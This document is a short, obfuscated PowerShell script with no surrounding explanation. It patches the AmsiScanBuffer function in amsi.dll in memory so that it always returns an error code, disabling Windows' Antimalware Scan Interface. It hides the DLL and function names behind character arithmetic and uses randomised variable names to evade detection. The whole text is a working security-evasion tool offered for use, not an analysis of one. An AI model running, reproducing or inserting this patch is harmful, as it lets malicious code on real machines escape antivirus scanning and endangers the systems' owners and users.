$V1KLlA_yegu = @"
using System;
using System.Runtime.InteropServices;
public class V1KLlA_yegu {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr qxNrRELiHWXSKHsFq1_, string zRtr5zdT3co37e9fTwy);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr HR8Z4, UIntPtr WJhjfsA, uint al7G, out uint Fk4);
}
"@

Add-Type $V1KLlA_yegu

$_nQ8TAjanO = [V1KLlA_yegu]::LoadLibrary("$([ChAR](97*80/80)+[Char]([bytE]0x6d)+[cHAR]([byte]0x73)+[CHAR](105*20/20)+[CHar](24+22)+[Char]([bYte]0x64)+[cHaR](108*25/25)+[cHaR]([BYtE]0x6c))")
$LXeJ_l = [V1KLlA_yegu]::GetProcAddress($_nQ8TAjanO, "$([CHAr]([bYTE]0x41)+[ChAr]([bYtE]0x6d)+[ChAr](115+26-26)+[ChaR](15+90)+[cHAr]([BytE]0x53)+[cHaR]([bYte]0x63)+[cHAr]([byTE]0x61)+[cHAR]([ByTe]0x6e)+[chAr](66)+[CHAR](117)+[chAR](102)+[cHaR]([BYte]0x66)+[cHAR](101*31/31)+[cHar](75+39))")
$p = 0
[V1KLlA_yegu]::VirtualProtect($LXeJ_l, [uint32]5, 0x40, [ref]$p)
$XKYXH = "0xB8"
$q4jurtyIJNsXdqkl_E = "0x57"
$Oy6u = "0x00"
$ydHYcTA98h = "0x07"
$uh3CJw = "0x80"
$wrVUtj0WI = "0xC3"
$CIP5zX7mGP = [Byte[]] ($XKYXH,$q4jurtyIJNsXdqkl_E,$Oy6u,$ydHYcTA98h,+$uh3CJw,+$wrVUtj0WI)
[System.Runtime.InteropServices.Marshal]::Copy($CIP5zX7mGP, 0, $LXeJ_l, 6)